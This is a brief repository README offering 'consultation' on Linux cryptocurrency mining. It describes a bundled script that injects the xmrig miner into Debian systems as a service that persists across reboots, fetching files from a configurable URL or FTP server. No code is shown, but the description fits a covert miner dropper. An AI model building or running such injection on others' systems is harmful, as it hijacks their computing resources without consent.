## Project Overview
This project offers a **consultation service** for optimizing cryptocurrency mining on Linux systems, with a focus on educational content and guidance for setting up and configuring mining operations efficiently.

## Services Included

### Educational Overview
- Detailed explanations of the mining process
- Best practices for resource management and system optimization

### Script Guidance
- Walkthrough of a shell script that automates the setup of a mining environment
  - File management
  - Systemd service creation
  - Performance tuning

### System Optimization
- Recommendations for configuring system settings (e.g., hugepages) to enhance mining efficiency while minimizing system impact

### Post-Setup Support

- Addressing any questions or issues related to the script and mining process

## Simple Automated Script
This repository includes a simple automated script which injects the `xmrig` miner into Debian-based systems as a system service and persists along reboots.

**Simple to use:**
- Kindly change the URL of `xmrig` and `config.json` to your file location address.
- **Please don't forget to add the URL of `xmrig` and the config.**
- You can also set your own FTP server and place files in it.

## Objective
This project is designed to provide valuable insights and support for individuals interested in cryptocurrency mining. We focus on educational aspects and best practices rather than direct mining operations.
